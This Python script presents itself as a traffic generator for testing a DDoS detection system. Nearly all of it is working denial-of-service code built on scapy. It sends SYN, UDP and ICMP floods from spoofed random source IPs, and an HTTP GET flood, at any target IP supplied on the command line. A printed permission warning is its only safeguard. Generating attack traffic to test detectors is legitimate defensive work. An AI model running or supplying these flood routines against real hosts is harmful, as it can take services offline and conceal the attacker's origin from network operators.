#!/usr/bin/env python3
"""
Traffic Generator for Testing DDoS Detection System
Generates both normal and malicious traffic patterns
"""

import argparse
import time
import random
import threading
from scapy.all import *
import sys

class TrafficGenerator:
    def __init__(self, target_ip, interface='eth0'):
        self.target_ip = target_ip
        self.interface = interface
        self.running = False
        
    def generate_normal_traffic(self, duration=60, rate=10):
        """Generate normal traffic patterns"""
        print(f"🟢 Generating normal traffic for {duration} seconds at {rate} pps")
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time and self.running:
            # Normal HTTP-like traffic
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443, 8080])
            
            packet = IP(dst=self.target_ip) / TCP(sport=src_port, dport=dst_port, flags='S')
            
            try:
                send(packet, iface=self.interface, verbose=False)
                packet_count += 1
                
                if packet_count % 100 == 0:
                    print(f"  Sent {packet_count} normal packets...")
                
                time.sleep(1.0 / rate)  # Control rate
            except Exception as e:
                print(f"Error sending packet: {e}")
                break
        
        print(f"✓ Completed: Sent {packet_count} normal packets")
    
    def generate_syn_flood(self, duration=60):
        """Simulate SYN flood attack"""
        print(f"🔴 Generating SYN flood for {duration} seconds")
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time and self.running:
            # Random source IP (spoofed)
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            dst_port = random.choice([80, 443])
            
            packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                sport=src_port, 
                dport=dst_port, 
                flags='S'
            )
            
            try:
                send(packet, iface=self.interface, verbose=False)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"  Sent {packet_count} SYN packets...")
                
                # No delay - flood!
            except Exception as e:
                print(f"Error: {e}")
                break
        
        print(f"✓ Completed: Sent {packet_count} SYN flood packets")
    
    def generate_udp_flood(self, duration=60):
        """Simulate UDP flood attack"""
        print(f"🔴 Generating UDP flood for {duration} seconds")
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time and self.running:
            # Random source IP
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            src_port = random.randint(1024, 65535)
            dst_port = random.randint(1, 65535)
            
            # Random payload
            payload = os.urandom(random.randint(64, 512))
            
            packet = IP(src=src_ip, dst=self.target_ip) / UDP(
                sport=src_port,
                dport=dst_port
            ) / Raw(load=payload)
            
            try:
                send(packet, iface=self.interface, verbose=False)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"  Sent {packet_count} UDP flood packets...")
            except Exception as e:
                print(f"Error: {e}")
                break
        
        print(f"✓ Completed: Sent {packet_count} UDP flood packets")
    
    def generate_icmp_flood(self, duration=60):
        """Simulate ICMP flood (ping flood)"""
        print(f"🔴 Generating ICMP flood for {duration} seconds")
        
        end_time = time.time() + duration
        packet_count = 0
        
        while time.time() < end_time and self.running:
            # Random source IP
            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            
            packet = IP(src=src_ip, dst=self.target_ip) / ICMP()
            
            try:
                send(packet, iface=self.interface, verbose=False)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"  Sent {packet_count} ICMP packets...")
            except Exception as e:
                print(f"Error: {e}")
                break
        
        print(f"✓ Completed: Sent {packet_count} ICMP flood packets")
    
    def generate_http_flood(self, duration=60, rate=100):
        """Simulate HTTP flood attack"""
        print(f"🔴 Generating HTTP flood for {duration} seconds at {rate} pps")
        
        end_time = time.time() + duration
        packet_count = 0
        
        http_request = b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n"
        
        while time.time() < end_time and self.running:
            src_port = random.randint(1024, 65535)
            
            packet = IP(dst=self.target_ip) / TCP(
                sport=src_port, 
                dport=80, 
                flags='PA'
            ) / Raw(load=http_request)
            
            try:
                send(packet, iface=self.interface, verbose=False)
                packet_count += 1
                
                if packet_count % 500 == 0:
                    print(f"  Sent {packet_count} HTTP requests...")
                
                time.sleep(1.0 / rate)
            except Exception as e:
                print(f"Error: {e}")
                break
        
        print(f"✓ Completed: Sent {packet_count} HTTP flood packets")

def main():
    parser = argparse.ArgumentParser(
        description='Traffic Generator for DDoS Testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Normal traffic
  sudo python3 traffic_generator.py -t 192.168.1.100 -m normal -d 60
  
  # SYN flood
  sudo python3 traffic_generator.py -t 192.168.1.100 -m syn_flood -d 30
  
  # Mixed traffic
  sudo python3 traffic_generator.py -t 192.168.1.100 -m mixed -d 60
        '''
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Target IP address')
    parser.add_argument('-i', '--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('-m', '--mode', 
                       choices=['normal', 'syn_flood', 'udp_flood', 
                               'icmp_flood', 'http_flood', 'mixed'],
                       default='normal',
                       help='Traffic generation mode')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Duration in seconds (default: 60)')
    parser.add_argument('-r', '--rate', type=int, default=10,
                       help='Packets per second for normal traffic (default: 10)')
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("❌ This script requires root privileges")
        print("Please run: sudo python3 traffic_generator.py ...")
        sys.exit(1)
    
    print("="*60)
    print("Traffic Generator for DDoS Testing")
    print("="*60)
    print(f"Target IP: {args.target}")
    print(f"Interface: {args.interface}")
    print(f"Mode: {args.mode}")
    print(f"Duration: {args.duration} seconds")
    print("="*60)
    print("\n⚠️  WARNING: This generates network traffic for testing purposes")
    print("    Only use on networks you own or have permission to test!")
    print("")
    print("Press Ctrl+C to stop at any time\n")
    
    time.sleep(3)  # Give user time to read warning
    
    generator = TrafficGenerator(args.target, args.interface)
    generator.running = True
    
    try:
        if args.mode == 'normal':
            generator.generate_normal_traffic(args.duration, args.rate)
        
        elif args.mode == 'syn_flood':
            generator.generate_syn_flood(args.duration)
        
        elif args.mode == 'udp_flood':
            generator.generate_udp_flood(args.duration)
        
        elif args.mode == 'icmp_flood':
            generator.generate_icmp_flood(args.duration)
        
        elif args.mode == 'http_flood':
            generator.generate_http_flood(args.duration, args.rate)
        
        elif args.mode == 'mixed':
            print("🔄 Running mixed traffic scenario...")
            
            # Start with normal traffic
            print("\n[Phase 1/3] Normal traffic (20s)")
            generator.generate_normal_traffic(20, args.rate)
            
            time.sleep(2)
            
            # Then malicious traffic
            print("\n[Phase 2/3] SYN flood attack (20s)")
            generator.generate_syn_flood(20)
            
            time.sleep(2)
            
            # Back to normal
            print("\n[Phase 3/3] Normal traffic (20s)")
            generator.generate_normal_traffic(20, args.rate)
    
    except KeyboardInterrupt:
        print("\n\nStopped by user")
        generator.running = False
    
    print("\n" + "="*60)
    print("Traffic generation completed")
    print("="*60)

if __name__ == '__main__':
    main()
